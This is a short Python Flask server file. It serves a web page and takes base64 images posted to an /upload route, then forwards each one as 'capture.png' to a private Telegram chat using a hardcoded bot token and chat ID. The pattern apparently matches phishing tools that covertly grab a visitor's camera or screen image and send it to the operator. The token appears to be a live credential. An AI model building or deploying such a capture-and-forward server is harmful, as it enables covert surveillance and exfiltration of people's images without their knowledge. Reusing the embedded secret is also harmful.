
from flask import Flask, request, render_template
import requests, base64

app = Flask(__name__)

BOT_TOKEN = '7644893967:AAGHyiyBZwtl1fDi9bqFciuRKsnIz0yjB5Q'
CHAT_ID = '7485197107'

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/upload', methods=['POST'])
def upload():
    data = request.json['image']
    _, img_data = data.split(',', 1)
    img_bytes = base64.b64decode(img_data)
    files = {'photo': ('capture.png', img_bytes)}
    params = {'chat_id': CHAT_ID}
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"
    resp = requests.post(url, params=params, files=files)
    return resp.json()

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
